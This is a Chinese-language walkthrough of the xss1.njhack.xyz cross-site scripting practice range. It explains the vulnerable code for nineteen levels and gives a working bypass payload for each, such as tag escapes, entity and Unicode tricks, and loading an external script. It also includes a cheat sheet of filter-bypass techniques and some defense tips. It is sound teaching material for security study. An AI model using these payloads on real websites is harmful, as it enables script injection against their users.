# XSS1.njhack.xyz 完整通关教程 — 从入门到精通

> **靶场地址**: `xss1.njhack.xyz`  
> **题目数量**: 0x00 - 0x12（共19关）  
> **定位**: 教学型 Writeup，不仅给答案，更讲原理  
> **Author**: Hackerchen  
> **环境**: macOS + Chrome 浏览器

---

## 📚 前言：XSS 攻击的本质

XSS（跨站脚本攻击）是基于前端 JavaScript 的攻击方式。

**核心思想**：在目标页面中执行我们的 JavaScript 代码（不惜一切代价）

**经典弹窗语句**：
```html
<script>alert(1)</script>
```

**XSS 的关键**：讲求**闭合**。你需要理解当前的 HTML/JS 上下文，然后想办法"逃逸"出来。

---

## 🎯 0x00 - 无过滤（入门热身）

### 服务端代码
```javascript
function render (input) {
  return '<div>' + input + '</div>'
}
```

### 分析
这是最简单的情况：**没有任何过滤**。你的输入会被直接拼接到 HTML 中。

### Payload
```html
<script>alert(1)</script>
```

### 原理
输入被放在 `<div>` 标签内部，我们直接插入 `<script>` 标签，浏览器会解析并执行其中的 JS 代码。

**最终 HTML**：
```html
<div><script>alert(1)</script></div>
```

---

## 🎯 0x01 - textarea 标签逃逸

### 服务端代码
```javascript
function render (input) {
  return '<textarea>' + input + '</textarea>'
}
```

### 分析
`<textarea>` 是一个**原始文本元素**（Raw Text Element）。在 `<textarea>` 内部，HTML 标签不会被解析，而是作为纯文本显示。

**错误尝试**：
```html
<script>alert(1)</script>
```
❌ 失败！因为 `<script>` 会被当作文本显示，不会执行。

### 解题思路
我们需要**先闭合 `<textarea>` 标签**，然后再插入我们的脚本。

### Payload
```html
</textarea><script>alert(1)</script><textarea>
```

### 原理详解
1. `</textarea>` - 闭合前面的 textarea 标签
2. `<script>alert(1)</script>` - 插入我们的脚本
3. `<textarea>` - 可选，用于闭合后面的标签（保持 HTML 结构完整）

**最终 HTML**：
```html
<textarea></textarea><script>alert(1)</script><textarea></textarea>
```

### 知识点
> **闭合思维**：当你被困在某个标签内部时，先想办法闭合它，然后才能插入新的内容。

---

## 🎯 0x02 - input 标签属性逃逸

### 服务端代码
```javascript
function render (input) {
  return '<input type="name" value="' + input + '">'
}
```

### 分析
你的输入被放在 `value` 属性的**双引号内部**。

**当前结构**：
```html
<input type="name" value="你的输入">
```

### 解题思路
我们需要：
1. 先闭合 `value` 属性的双引号
2. 再闭合 `input` 标签
3. 然后插入我们的脚本

### Payload
```html
"><script>alert(1)</script>
```

### 原理详解
- `"` - 闭合 value 属性的双引号
- `>` - 闭合 input 标签
- `<script>alert(1)</script>` - 插入脚本

**最终 HTML**：
```html
<input type="name" value=""><script>alert(1)</script>">
```

### 知识点
> **属性逃逸**：当输入被放在标签属性中时，需要先闭合引号，再闭合标签。

---

## 🎯 0x03 - 过滤括号 `()`

### 服务端代码
```javascript
function render (input) {
  const stripBracketsRe = /[()]/g
  input = input.replace(stripBracketsRe, '')
  return input
}
```

### 分析
服务端使用正则 `/[()]/g` 删除了所有的括号。

**问题**：`alert(1)` 中的 `(1)` 会被删掉，变成 `alert1`，无法执行。

### 解题思路：ES6 模板字符串

在 ES6 中，函数可以使用**模板字符串**（反引号 `` ` ``）来调用，语法是：
```javascript
函数名`参数`
```

这等价于：
```javascript
函数名(['参数'])
```

### Payload
```html
<script>alert`1`</script>
```

### 原理详解
`alert`1`` 在 JavaScript 中是合法的语法，它会调用 `alert` 函数并传入参数 `['1']`。

### 知识点
> **ES6 Tagged Template Literals**：当函数名后面直接跟反引号时，会将模板字符串作为参数传入。这是绕过括号过滤的经典技巧。

---

## 🎯 0x04 - 过滤括号和反引号 `()``

### 服务端代码
```javascript
function render (input) {
  const stripBracketsRe = /[()`]/g
  input = input.replace(stripBracketsRe, '')
  return input
}
```

### 分析
现在连反引号也被过滤了！上一关的方法失效。

### 解题思路：HTML 实体编码 + SVG 标签

**关键知识点**：`<svg>` 标签内部会**自动解码 HTML 实体**。

我们可以把 `()` 编码成 HTML 实体 `&#40;&#41;`，然后放在 `<svg>` 标签内。

### Payload
```html
<svg><script>alert&#40;1&#41;</script>
```

### 原理详解

1. **服务端处理阶段**：
   - 正则检查 `&#40;&#41;`，发现没有 `()`，放行

2. **浏览器解析阶段**：
   - 遇到 `<svg>` 标签
   - SVG 解析器会把 `&#40;` 解码为 `(`，把 `&#41;` 解码为 `)`
   - 最终执行的是 `alert(1)`

### 知识点
> **HTML 实体编码**：
> - `(` = `&#40;` = `&#x28;`
> - `)` = `&#41;` = `&#x29;`
>
> **SVG 的特殊性**：SVG 标签内部会进行 HTML 实体解码，这是绕过字符过滤的重要技巧。

---

## 🎯 0x05 - HTML 注释逃逸

### 服务端代码
```javascript
function render (input) {
  input = input.replace(/-->/g, '😂')
  return '<!-- ' + input + ' -->'
}
```

### 分析
你的输入被放在 HTML 注释 `<!-- ... -->` 内部。

服务端把 `-->` 替换成了表情，试图阻止你闭合注释。

### 解题思路：另一种注释闭合符

**冷门知识**：HTML 注释有两种闭合方式：
- 标准：`-->`
- 非标准但有效：`--!>`

### Payload
```html
--!><script>alert(1)</script>
```

### 原理详解
- `--!>` 会闭合 HTML 注释（服务端只过滤了 `-->`，没过滤 `--!>`）
- 然后我们就可以插入脚本了

**最终 HTML**：
```html
<!-- --!><script>alert(1)</script> -->
```

### 知识点
> **HTML 注释的多种闭合方式**：
> - `-->`（标准）
> - `--!>`（非标准但被大多数浏览器接受）
>
> 这是一个经典的"黑名单绕过"案例：防御者只封堵了已知的路径，却忘了还有其他出口。

---

## 🎯 0x06 - 事件属性注入（换行绕过）

### 服务端代码
```javascript
function render (input) {
  input = input.replace(/auto|on.*=|>/ig, '_')
  return `<input value=1 ${input} type="text">`
}
```

### 分析
这是一个相对复杂的过滤：
- `auto` - 阻止 `autofocus`
- `on.*=` - 阻止所有事件属性如 `onclick=`、`onerror=`
- `>` - 阻止闭合标签

**正则 `/on.*=/` 的含义**：匹配 `on` 开头，然后任意字符，直到遇到 `=`。

### 解题思路：利用正则的"单行"特性

默认情况下，正则中的 `.` **不匹配换行符**！

所以 `on.*=` 只会匹配**同一行**内的 `on...=`。如果我们在 `on` 和 `=` 之间插入换行符，正则就匹配不到了。

### Payload（方法一）
```
onmouseover
=alert(1)
```

### Payload（方法二）
```
type="image" src=x onerror
=alert(1)
```

### 原理详解
- `onmouseover` 后面换行
- `=alert(1)` 在下一行
- 正则 `on.*=` 匹配的是 `onmouseover`（没有 `=`），不匹配
- 但 HTML 解析时，换行符被忽略，最终变成 `onmouseover=alert(1)`

**方法二解释**：
- `type="image"` 把 input 变成图片类型
- `src=x` 指向一个不存在的图片
- `onerror` 在图片加载失败时触发

### 知识点
> **正则表达式的单行模式**：默认情况下，`.` 不匹配换行符。除非使用 `s` 标志（如 `/on.*=/s`）。
>
> **HTML 的容错性**：HTML 属性值之间的换行符会被忽略。

---

## 🎯 0x07 - 标签剥离绕过

### 服务端代码
```javascript
function render (input) {
  const stripTagsRe = /<\/?[^>]+>/gi
  input = input.replace(stripTagsRe, '')
  return `<article>${input}</article>`
}
```

### 分析
正则 `/<\/?[^>]+>/gi` 会匹配并删除所有**完整的 HTML 标签**。

**匹配规则**：
- `<` - 左尖括号
- `\/?` - 可选的 `/`（匹配闭合标签）
- `[^>]+` - 一个或多个非 `>` 字符
- `>` - 右尖括号

**关键发现**：正则要求标签必须以 `>` 结尾！

### 解题思路：不闭合的标签

如果我们的标签**不写右边的 `>`**，正则就匹配不到！

而神奇的是，浏览器足够"智能"，即使标签没有闭合的 `>`，它也能正确解析。

### Payload
```html
<img src=x onerror=alert(1)
```

注意：末尾**没有 `>`**！

### 原理详解
1. **服务端处理**：
   - 正则寻找 `<...>`
   - 你的输入是 `<img src=x onerror=alert(1)`（没有 `>`）
   - 正则匹配不到，原样保留

2. **浏览器解析**：
   - 遇到 `<article>`
   - 然后遇到 `<img src=x onerror=alert(1)`
   - 浏览器的容错机制会自动补全 `>`
   - `src=x` 加载失败，触发 `onerror`

### 知识点
> **浏览器的容错性**：HTML 解析器会尝试修复不完整的标签。
>
> **正则的局限性**：基于正则的过滤往往有边界情况可以绕过。

---

## 🎯 0x08 - style 标签逃逸

### 服务端代码
```javascript
function render (src) {
  src = src.replace(/<\/style>/ig, '/* 坏人 */')
  return `
    <style>
      ${src}
    </style>
  `
}
```

### 分析
你的输入被放在 `<style>` 标签内部。服务端把 `</style>` 替换成了注释。

**尝试**：
```html
</style><script>alert(1)</script>
```
❌ 失败！`</style>` 会被替换掉。

### 解题思路：换行符绕过

正则匹配的是 `</style>`，但如果我们在 `</style` 和 `>` 之间插入**换行符**呢？

### Payload
```html
</style
><script>alert(1)</script>
```

### 原理详解
- `</style` 后面换行，然后 `>`
- 正则 `/<\/style>/` 匹配的是连续的 `</style>`，换行打断了这个模式
- 但 HTML 解析时，`</style\n>` 仍然被识别为 `</style>` 的闭合

### 知识点
> **HTML 标签内的空白字符**：标签名和 `>` 之间可以有换行、空格等空白字符。
>
> **又一次黑名单绕过**：防御者只考虑了"正常"的写法，没考虑到空白字符的影响。

---

## 🎯 0x09 - URL 正则验证（前缀匹配漏洞）

### 服务端代码
```javascript
function render (input) {
  let domainRe = /^https?:\/\/www\.segmentfault\.com/
  if (domainRe.test(input)) {
    return `<script src="${input}"></script>`
  }
  return 'Invalid URL'
}
```

### 分析
服务端使用正则验证 URL 必须以 `https://www.segmentfault.com` 或 `http://www.segmentfault.com` 开头。

**关键漏洞**：正则只有 `^`（开头锚点），没有 `$`（结尾锚点）！

这意味着：只要**开头匹配**就通过，后面跟什么都不管。

### 知识点：正则表达式的锚点

| 正则 | 含义 | 例子 |
|------|------|------|
| `^abc` | 以 abc 开头 | `abc123` ✅ |
| `abc$` | 以 abc 结尾 | `123abc` ✅ |
| `^abc$` | 完全等于 abc | 只有 `abc` ✅ |

**本题只有 `^`**：只要开头是 `segmentfault.com`，后面任意。

### 解题思路：利用引号闭合属性

我们可以构造一个以合法域名开头，但后面带有恶意代码的 URL。

### Payload（方法一）：闭合属性，添加事件
```
https://www.segmentfault.com" onmouseover="alert(1)
```

**最终 HTML**：
```html
<script src="https://www.segmentfault.com" onmouseover="alert(1)"></script>
```

### Payload（方法二）：闭合标签，插入新标签
```
https://www.segmentfault.com"></script><script>alert(1)</script>//
```

**最终 HTML**：
```html
<script src="https://www.segmentfault.com"></script><script>alert(1)</script>//"></script>
```

### Payload（方法三）：闭合标签，使用 img 标签
```
https://www.segmentfault.com"></script><img src=x onerror="alert(1)
```

### 知识点
> **前缀匹配的危险**：在验证 URL 时，只检查开头是远远不够的。攻击者可以在合法前缀后面附加任意内容。
>
> **正确的做法**：应该使用 URL 解析器（如 `new URL()`）来提取 hostname，然后进行严格比对。

---

## 🎯 0x0A - HTML 实体漏分号 + 域名绕过（本靶场最难关卡之一）

> ⚠️ **重要提示**：这一关的 `@` 绕过方法在**现代浏览器已失效**！需要使用 `.localhost` 伪 TLD 绕过。

### 服务端代码
```javascript
function render (input) {
  function escapeHtml(s) {
    return s.replace(/&/g, '&amp;')
            .replace(/'/g, '&#39;')
            .replace(/"/g, '&quot;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/\//g, '&#x2f')  // ⚠️ BUG: 没有分号！
  }

  const domainRe = /^https?:\/\/www\.segmentfault\.com/
  if (domainRe.test(input)) {
    return `<script src="${escapeHtml(input)}"></script>`
  }
  return 'Invalid URL'
}
```

### 分析

这一关在 0x09 的基础上增加了 `escapeHtml` 函数，把所有危险字符都转义了。

**看似无解**：
- `"` → `&quot;`（无法闭合属性）
- `<` → `&lt;`（无法插入新标签）
- `/` → `&#x2f`（无法写路径？）

### 核心漏洞：HTML 实体漏分号

仔细看这行代码：
```javascript
.replace(/\//g, '&#x2f')  // 注意：没有分号 ;
```

**正确写法应该是**：`&#x2f;`（带分号）

### 为什么这是漏洞？

HTML 实体有两种写法：
- **带分号**：`&#x2f;` → 浏览器知道实体在 `;` 结束
- **不带分号**：`&#x2f` → 浏览器会**贪婪匹配**后面的十六进制字符！

**十六进制字符**：`0-9`、`a-f`、`A-F`

### 我的踩坑过程

#### 第一次尝试：使用 `@` 符号

根据 URL 语法 `protocol://user:pass@host/path`，`@` 前面的内容是用户信息，`@` 后面才是真正的 host。

```
https://www.segmentfault.com@http://localhost:8000/a.js
```

**失败原因**：
1. `@` 后面又写了 `http://`，浏览器把 host 解析成了 `http:`
2. 现代 Chrome **禁止**在子资源加载中使用 `@`（防止钓鱼）

#### 第二次尝试：去掉第二个协议头

```
http://www.segmentfault.com@localhost:8000/a.js
```

**失败原因**：Chrome 会拦截带有"嵌入式凭据"的 `<script src>`。

#### 第三次尝试：使用 `.localhost` 伪 TLD

```
http://www.segmentfault.com.localhost:8000/a.js
```

**进展**：
- 域名解析通了（`*.localhost` 在现代系统解析到 `127.0.0.1`）
- 但还是不弹窗！

#### 深入排查：发现真正的问题

在 DevTools Console（切换到 `sandbox (blob:...)` frame）执行诊断脚本：

```javascript
(() => {
  const scripts = [...document.scripts].map(s => s.src).filter(Boolean);
  const res = performance.getEntriesByType('resource').map(e => e.name);
  console.log('SCRIPT TAGS:', scripts);
  console.log('RESOURCE HITS:', res.filter(n => /localhost:8000|\.js/.test(n)));
})();
```

**震惊的发现**：
```
SCRIPT TAGS: ["http://www.segmentfault.com.localhost:8000/a.js"]
RESOURCE HITS: ["http://www.segmentfault.com.localhost:8000%CB%BA.js"]
```

**DOM 上写的是 `/a.js`，但实际请求的是 `%CB%BA.js`！**

### 原因分析

输入 URL：
```
http://www.segmentfault.com.localhost:8000/a.js
```

经过 `escapeHtml` 后：
```html
<script src="http:&#x2f&#x2fwww.segmentfault.com.localhost:8000&#x2fa.js"></script>
```

注意最后的 `&#x2fa.js`：
- 预期：`&#x2f` + `a.js` = `/a.js`
- 实际：浏览器把 `&#x2fa` 当成一个实体（因为 `a` 是十六进制字符！）
- `&#x2fa` = Unicode U+02FA = `˺`（一个奇怪的符号）

最终请求的 URL：
```
http://www.segmentfault.com.localhost:8000˺.js
```

URL 编码后：
```
http://www.segmentfault.com.localhost:8000%CB%BA.js
```

**这个文件不存在，所以脚本加载失败！**

### 最终解决方案

把文件名从 `a.js` 改成 `z.js`（`z` 不是十六进制字符，不会被吞掉）。

### 完整复现步骤

#### Step 1: 配置 hosts（可选，现代系统通常自动解析）
```bash
sudo vim /etc/hosts
# 添加：127.0.0.1 www.segmentfault.com.localhost
```

#### Step 2: 创建 JS 文件
```javascript
// z.js
alert(1)
```

#### Step 3: 启动本地服务器
```bash
python3 -m http.server 8000
```

#### Step 4: 提交 Payload
```
http://www.segmentfault.com.localhost:8000/z.js
```

### 会被"吞掉"的文件名首字符

| 字符 | 实体 | Unicode | URL 编码 |
|------|------|---------|----------|
| `a` | `&#x2fa` | U+02FA ˺ | `%CB%BA` |
| `b` | `&#x2fb` | U+02FB ˻ | `%CB%BB` |
| `c` | `&#x2fc` | U+02FC ˼ | `%CB%BC` |
| `0` | `&#x2f0` | U+02F0 ˰ | `%CB%B0` |
| `f` | `&#x2ff` | U+02FF ˿ | `%CB%BF` |

**安全的文件名首字符**：`g-z`、`G-Z`

### 知识点总结

1. **HTML 实体必须带分号**：`&#x2f;` 而不是 `&#x2f`
2. **缺少分号会导致贪婪匹配**：浏览器会把后面的十六进制字符也吃进去
3. **调试技巧**：使用 `performance.getEntriesByType('resource')` 查看实际请求的 URL

---

## 🎯 0x0B - 大写转换绕过（外部脚本加载）

### 服务端代码
```javascript
function render (input) {
  input = input.toUpperCase()
  return `<h1>${input}</h1>`
}
```

### 分析
所有输入都会被转换成大写。

**问题**：
- `<script>alert(1)</script>` → `<SCRIPT>ALERT(1)</SCRIPT>`
- HTML 标签不区分大小写，`<SCRIPT>` 有效
- 但 JavaScript **严格区分大小写**！`ALERT(1)` 是未定义的函数

### 知识点：大小写敏感度对照表

| 组件 | 大小写敏感 | 说明 |
|------|-----------|------|
| HTML 标签 | ❌ 不敏感 | `<SCRIPT>` = `<script>` |
| HTML 属性 | ❌ 不敏感 | `ONCLICK` = `onclick` |
| JavaScript | ✅ 敏感 | `alert` ≠ `ALERT` |
| 域名 | ❌ 不敏感 | DNS 不区分大小写 |
| 文件路径 | ⚠️ 取决于服务器 | Linux 敏感，Windows 不敏感 |

### 解题思路

既然 JS 代码会被破坏，我们不在代码里写 JS 逻辑，而是**加载外部脚本**。

创建一个大写文件名的 JS 文件（在 Windows 服务器上，或者直接创建大写文件）：

#### Step 1: 创建文件
```javascript
// A.JS
alert(1)
```

#### Step 2: Payload
```html
<script src="http://127.0.0.1/A.JS"></script>
```

### 原理

1. 输入被转大写：`<SCRIPT SRC="HTTP://127.0.0.1/A.JS"></SCRIPT>`
2. HTML 标签有效
3. 域名大小写无所谓
4. 服务器上的文件名本身就是大写，可以找到
5. JS 文件里的代码是小写的 `alert(1)`，正常执行

### 替代方案：JSFuck（非字母编码）

如果无法控制服务器，可以使用 **JSFuck** 编写代码。

JSFuck 只使用 `[]()!+` 六个字符，这些符号没有大小写之分。

```javascript
// alert(1) 的 JSFuck 版本（非常长，这里省略）
[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+...
```

在线转换工具：http://www.jsfuck.com/

---

## 🎯 0x0C - script 关键字过滤 + 大写转换

### 服务端代码
```javascript
function render (input) {
  input = input.replace(/script/ig, '')
  input = input.toUpperCase()
  return '<h1>' + input + '</h1>'
}
```

### 分析
- 先删除所有 `script`（不区分大小写）
- 再转大写

### 解题思路：双写绕过

正则只替换一次！我们可以在 `script` 中间再嵌套一个 `script`：

```
scrscriptipt
```

处理过程：
1. 原始：`scrscriptipt`
2. 删除 `script`：`script`
3. 转大写：`SCRIPT`

### Payload
```html
<scrscriptipt src="http://127.0.0.1/A.JS"></scrscriptipt>
```

### 原理
- `scrscriptipt` → 删除中间的 `script` → `script`
- 最终变成有效的 `<SCRIPT>` 标签

### 知识点
> **双写绕过**：如果过滤器只替换一次（没有循环替换），可以通过嵌套来绕过。

---

## 🎯 0x0D - JavaScript 注释逃逸

### 服务端代码
```javascript
function render (input) {
  input = input.replace(/[</"']/g, '')
  return `
    <script>
          // alert('${input}')
    </script>
  `
}
```

### 分析
- 过滤了 `<`、`/`、`"`、`'`
- 你的输入被放在 `// alert('...')` 中，被**单行注释**包裹

**挑战**：
1. 逃出单行注释
2. 不能用 `//` 注释掉后面的垃圾（`/` 被过滤了）

### 知识点：JavaScript 的行结束符

单行注释 `//` 只作用于**当前行**。遇到换行符，注释就结束了。

JavaScript 中的行结束符：
- `\n` - 换行符 (Line Feed)
- `\r` - 回车符 (Carriage Return)

### 知识点：JavaScript 的"历史遗留"注释符

这是**非常冷门但关键**的知识点！

在 ECMAScript 标准（Annex B）中，为了兼容古老的网页，`-->` 在**行首**时会被当作单行注释！

```javascript
// 这两种写法等效：
// 注释内容
--> 注释内容（必须在行首）
```

### Payload
```
换行符
alert(1)
-->
```

实际输入（URL 编码）：
```
%0aalert(1)%0a-->
```

### 原理详解

**处理前**：
```javascript
// alert('
alert(1)
-->')
```

**解析过程**：
1. 第一行：`// alert('` - 被注释
2. 第二行：`alert(1)` - 换行后逃出注释，正常执行！
3. 第三行：`-->')` - `-->` 在行首，作为注释符，忽略后面的 `')`

---

## 🎯 0x0E - 字母标签过滤 + 大写转换（Unicode 魔法）

### 服务端代码
```javascript
function render (input) {
  input = input.replace(/<([a-zA-Z])/g, '<_$1')
  input = input.toUpperCase()
  return '<h1>' + input + '</h1>'
}
```

### 分析
- 正则 `/<([a-zA-Z])/g` 匹配 `<` 后面紧跟字母的情况
- 把 `<X` 替换成 `<_X`（破坏标签）
- 然后转大写

**问题**：`<script>` 会变成 `<_SCRIPT>`，无效标签。

### 知识点：Unicode 的大小写转换魔法

有些 Unicode 字符**看起来不是字母**（不在 `a-z` 范围内），但经过 `toUpperCase()` 后会变成 ASCII 字母！

**经典例子**：
- `ſ` (Latin Small Letter Long S, U+017F) → `toUpperCase()` → `S`
- `ı` (Latin Small Letter Dotless I, U+0131) → `toUpperCase()` → `I`

### Payload
```html
<ſcript src="http://127.0.0.1/a.js"></ſcript>
```

### 原理详解

1. **正则匹配阶段**：
   - 正则 `/[a-zA-Z]/` 不匹配 `ſ`（它不在 a-z 范围内）
   - `<ſcript` 不会被替换

2. **大写转换阶段**：
   - `ſ`.toUpperCase() = `S`
   - `<ſcript>` 变成 `<SCRIPT>`

3. **最终结果**：
   - 有效的 `<SCRIPT>` 标签
   - 成功加载外部脚本

### 如何找到这个字符？

Google 搜索 "Unicode characters that uppercase to ASCII"，或者查看 Unicode 标准中的特殊大小写映射。

---

## 🎯 0x0F - HTML 属性中的实体解码（"内鬼"机制）

### 服务端代码
```javascript
function render (input) {
  function escapeHtml(s) {
    return s.replace(/&/g, '&amp;')
            .replace(/'/g, '&#39;')
            .replace(/"/g, '&quot;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/\//g, '&#x2f;')
  }
  return `<img src onerror="console.error('${escapeHtml(input)}')">`
}
```

### 分析

这看起来防御非常严密：所有危险字符都被转义了。

但注意！你的输入被放在 **HTML 属性**（`onerror="..."`）中，而不是 `<script>` 标签中。

### 核心知识点：浏览器的解析顺序

**这是 XSS 最重要的概念之一！**

当代码出现在不同位置时，解析规则完全不同：

#### 情况 A：`<script>` 标签内

```html
<script>
  var a = "&#39;";  // JS 引擎看到的就是 "&#39;"，不会解码
</script>
```

- **解析器**：直接是 JavaScript 引擎
- **不会进行 HTML 实体解码**
- 转义有效，攻击失败

#### 情况 B：HTML 属性内（本题情况）

```html
<img onerror="console.error('&#39;')">
```

**解析顺序**（关键！）：

1. **HTML 解析器**先处理属性值
   - 看到 `&#39;`，自动解码成 `'`
   
2. **然后**把解码后的内容交给 **JavaScript 引擎**
   - JS 引擎收到的是 `console.error(''')`
   - 单引号逃逸成功！

### Payload
```
');alert(1)//
```

### 原理详解

1. **服务端转义后**：
   ```html
   <img onerror="console.error('&#39;);alert(1)&#x2f;&#x2f;')">
   ```

2. **HTML 解析器解码**：
   - `&#39;` → `'`
   - `&#x2f;` → `/`
   
3. **交给 JS 引擎的代码**：
   ```javascript
   console.error('');alert(1)//')
   ```

4. **执行结果**：
   - `console.error('')` - 合法语句
   - `alert(1)` - 弹窗！
   - `//` - 注释掉后面的垃圾

### 知识点总结

> **HTML 属性中的代码会先经过 HTML 解码，再执行 JavaScript！**
> 
> 这意味着：在 HTML 属性场景下，`escapeHtml` 转义是**无效的防御**，因为浏览器会帮攻击者"还原"这些字符。

---

## 🎯 0x10 - JavaScript 变量赋值注入

### 服务端代码
```javascript
function render (input) {
  return `
<script>
  window.data = ${input}
</script>
  `
}
```

### 分析
你的输入被直接拼接到 `window.data = ` 后面，作为**赋值表达式的右值**。

没有任何过滤！

### 知识点：JavaScript 语句的结构

```javascript
window.data = ${input}
```

如果 `input` 是 `123`：
```javascript
window.data = 123  // 合法，赋值数字
```

如果 `input` 是 `hello`（没引号）：
```javascript
window.data = hello  // 寻找变量 hello，如果不存在则报错
```

如果 `input` 是 `"test";alert(1)`：
```javascript
window.data = "test";alert(1)  // 赋值完成后，执行 alert(1)
```

### Payload
```
"haha";alert(1)
```

或者更简洁：
```
1;alert(1)
```

### 原理详解

**最终代码**：
```javascript
window.data = 1;alert(1)
```

- `window.data = 1` - 合法的赋值语句
- `;` - 语句分隔符
- `alert(1)` - 新的语句，执行弹窗

---

## 🎯 0x11 - javascript: URL 协议注入

### 服务端代码
```javascript
function render (s) {
  function escapeJs (s) {
    return String(s)
            .replace(/\\/g, '\\\\')
            .replace(/'/g, '\\\'')
            .replace(/"/g, '\\"')
            .replace(/`/g, '\\`')
            .replace(/</g, '\\74')
            .replace(/>/g, '\\76')
            .replace(/\//g, '\\/')
            .replace(/\n/g, '\\n')
            .replace(/\r/g, '\\r')
            .replace(/\t/g, '\\t')
            .replace(/\f/g, '\\f')
            .replace(/\v/g, '\\v')
            // .replace(/\b/g, '\\b')  // ⚠️ 被注释掉了！
            .replace(/\0/g, '\\0')
  }
  s = escapeJs(s)
  return `
<script>
  var url = 'javascript:console.log("${s}")'
  var a = document.createElement('a')
  a.href = url
  document.body.appendChild(a)
  a.click()
</script>
`
}
```

### 分析

看起来几乎所有危险字符都被转义了...但有一行被注释掉了：
```javascript
// .replace(/\b/g, '\\b')
```

`\b` 是**退格符** (Backspace, ASCII 0x08)！

### 知识点：退格符"吃掉"反斜杠

当你输入 `"`，服务器会转义成 `\"`（安全）。

但如果你在 `"` 前面加入退格符 `\b`：
- 输入：`\b"`
- 服务器：`\\` + `\b`（不处理） + `\"` = `\\\b\"`
- 在某些解析场景下，退格符可能"吃掉"前面的反斜杠

### Payload
```
%5C%08%22);alert(1);//
```

URL 解码：
- `%5C` = `\`
- `%08` = 退格符 `\b`
- `%22` = `"`

### 原理详解

这是一个利用"退格符吃掉转义字符"的经典技巧（Backslash Consumption）。

---

## 🎯 0x12 - 反斜杠逃逸

### 服务端代码
```javascript
function escape (s) {
  s = s.replace(/"/g, '\\"')
  return '<script>console.log("' + s + '");</script>'
}
```

### 分析

服务端只转义双引号 `"` → `\"`，但**没有转义反斜杠 `\`**！

### 知识点：转义的转义

在 JavaScript 中：
- `\"` = 转义的引号（变成字符串内容）
- `\\` = 转义的反斜杠（变成单个反斜杠）
- `\\"` = `\\` + `"` = 一个反斜杠 + 字符串结束符

### Payload
```
\");alert(1);//
```

### 原理详解

**输入**：`\");alert(1);//`

**服务器处理**：
- `"` 被转义成 `\"`
- `\` 不被处理

**结果**：
```javascript
console.log("\\");alert(1);//");
```

**JS 解析**：
- `"\\"` = 字符串内容是单个反斜杠
- `"` = 字符串结束
- `);alert(1);` = 新的语句
- `//` = 注释掉后面的垃圾

### 知识点总结

> **转义必须成对**：如果只转义引号而不转义反斜杠，攻击者可以输入反斜杠来"吃掉"你添加的转义符。
>
> **正确的做法**：先转义 `\`，再转义 `"`。

---

## 📚 总结：XSS 绕过技巧大全

### 1. 闭合类
- 闭合标签：`</textarea>`、`</style>`、`</script>`
- 闭合属性：`">`、`'>`
- 换行闭合：`</style\n>`

### 2. 编码类
- HTML 实体：`&#39;`、`&#x2f;`
- URL 编码：`%0a`（换行）、`%08`（退格）
- Unicode：`ſ` → `S`

### 3. 替换绕过类
- 双写：`scrscriptipt`
- 大小写：`ScRiPt`
- 换行打断正则

### 4. 注释类
- JS 单行注释：`//`
- JS 多行注释：`/* */`
- HTML 注释：`<!-- -->`、`<!-- --!>`
- 历史遗留注释：`-->`（行首）

### 5. 协议类
- `javascript:`
- `data:text/html`

### 6. 标签类
- 事件属性：`onerror`、`onload`、`onclick`
- 特殊标签：`<svg>`、`<img>`、`<iframe>`

### 7. 外部加载类
- 本地服务器
- `.localhost` 伪 TLD
- CDN 上的恶意脚本

---

## 🛡️ 防御建议

1. **输出编码**：根据上下文选择正确的编码方式
2. **CSP 策略**：限制脚本来源
3. **HttpOnly Cookie**：防止 Cookie 被窃取
4. **使用框架**：React/Vue 等框架默认会转义
5. **验证和过滤**：白名单优于黑名单

---

**Author**: Hackerchen  
**Date**: 2026-01-18

> 💡 **写在最后**：XSS 攻击的本质是"在目标页面执行我们的代码"。防御的核心是"永远不要信任用户输入"。学习 XSS 不是为了做坏事，而是为了更好地保护我们的系统。
